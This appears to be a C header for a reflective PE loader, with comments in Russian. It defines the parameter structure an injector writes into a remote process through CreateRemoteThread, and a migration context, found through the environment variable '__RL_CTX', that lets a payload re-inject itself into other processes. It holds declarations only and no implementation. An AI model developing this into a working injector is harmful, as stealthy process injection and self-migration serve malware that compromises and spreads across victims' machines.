#ifndef LOADER_H
#define LOADER_H

#include <windows.h>

// Сигнатура entry point для DLL
typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);

// Сигнатура entry point для EXE (стандартный mainCRTStartup)
typedef int (WINAPI *ExeEntry_t)(void);

// TLS callback
typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK_FN)(PVOID, DWORD, PVOID);

// Параметр, который инжектор кладёт в удалённый процесс.
// Загрузчик получает указатель на эту структуру через CreateRemoteThread.
// Та же структура используется при миграции: payload находит её по env-var
// "__RL_CTX" и переиспользует поля для повторной инжекции в другой процесс.
typedef struct _LOADER_PARAM {
    PVOID raw_pe;              // Указатель на сырые байты PE файла в текущем процессе
    DWORD raw_pe_size;         // Размер сырых байтов
    DWORD flags;               // 0 = DLL, 1 = EXE
    PVOID out_module_base;     // Загрузчик запишет сюда базу замапленного модуля

    // Контекст миграции — позволяет payload-у заинжектить себя дальше.
    // Заполняется инжектором (или предыдущей миграцией) и ВСЕГДА указывает
    // на копию секции .rldr в текущем процессе.
    PVOID loader_section;      // Адрес копии секции .rldr в этом процессе
    DWORD loader_section_size; // Размер копии секции .rldr
    DWORD entry_offset;        // Смещение ReflectiveLoader внутри секции
} LOADER_PARAM, *PLOADER_PARAM;

// Точка входа загрузчика, исполняется в удалённом процессе.
// Должна быть position-independent.
DWORD WINAPI Co2H_ReflectiveLoader(LPVOID param);

// Маркер конца кода загрузчика — нужен для расчёта размера копируемого блока
void Co2H_ReflectiveLoaderEnd(void);

#endif
